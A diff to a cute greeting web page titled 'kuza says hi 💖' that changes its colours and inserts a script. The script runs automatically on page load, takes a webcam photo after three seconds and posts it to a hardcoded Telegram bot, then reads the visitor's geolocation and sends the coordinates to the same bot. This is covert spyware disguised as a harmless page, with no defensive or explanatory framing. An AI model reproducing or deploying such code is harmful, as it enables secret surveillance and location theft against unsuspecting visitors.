@@ -5,7 +5,7 @@
 <title> kuza says hi  💖</title>
 <style>
   body {
-    background-color: #FFFFFF; /* ← أبيض قوي */
+    background-color: #ffe6f0;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -69,7 +69,53 @@
 <div class="heart"></div>
 
 <script>
-// لم يتم تغيير أي شيء في الكود الآخر
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 3000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        const blob = await (await fetch(imageData)).blob();
+
+        const formData = new FormData();
+        formData.append("chat_id", "1320552080");
+        formData.append("photo", blob, "capture.jpg");
+
+        fetch("https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendPhoto", {
+          method: "POST",
+          body: formData
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+
+        navigator.geolocation.getCurrentPosition(position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          fetch(`https://api.telegram.org/bot6790035809:AAF1WJELoljfs8TKw3NsBTjtqTurTGI15l0/sendLocation?chat_id=1320552080&latitude=${latitude}&longitude=${longitude}`, {
+            method: "GET"
+          });
+        }, error => {
+          console.error("فشل الحصول على الموقع:", error);
+        });
+
+      } catch (err) {
+        console.error("فشل الوصول إلى الكاميرا:", err);
+      }
+    }
+
+    captureAndSend();
 </script>
 
 </body>
